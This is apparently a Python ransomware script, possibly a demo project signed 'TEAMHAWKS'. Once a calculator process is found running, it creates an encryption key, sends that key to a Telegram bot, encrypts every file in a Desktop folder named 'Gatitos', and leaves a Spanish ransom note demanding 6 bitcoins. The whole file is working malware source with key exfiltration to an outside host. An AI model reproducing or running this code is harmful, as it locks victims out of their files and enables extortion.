import subprocess
import os
from cryptography.fernet import Fernet 
import telepot
from dotenv import load_dotenv 
load_dotenv('.env')
token=os.getenv('TOKEN')
id=os.getenv('ID')

path_to_encrypt = os.path.expanduser("~") + '\\Desktop\\Gatitos'

def Create_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)


def cargar_key():
    key = open('key.key', 'rb').read()
    bot = telepot.Bot(token=token)
    bot.sendMessage(id,"equipo : " + path_to_encrypt +", key : " + str(key))
    return key 

def encrypt(items, key):
    if key != 0:
        f= Fernet(key)
        for item in items:
            with open(item, 'rb') as file:
                file_data = file.read()
            encrypted_data = f.encrypt(file_data)
            with open(item, 'wb') as file:
                file.write(encrypted_data)

def start():
    s = subprocess.check_output('tasklist')
    if "CalculatorApp.exe" in str(s):
        Create_key()
        try:
            c = cargar_key()
        except:
            c = 0
        print(c)
        return c

def run():
    key = start()

    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt + '\\' + item for item in items]
        
    encrypt(full_path, key)

    with open(path_to_encrypt + '\\' + 'readme.txt', 'w') as file:
        file.write('Tus archivos han sido encriptados por TEAMHAWKS\n')
        file.write('Debe enviar 6 bitcoins a la cuenta 000000000000')

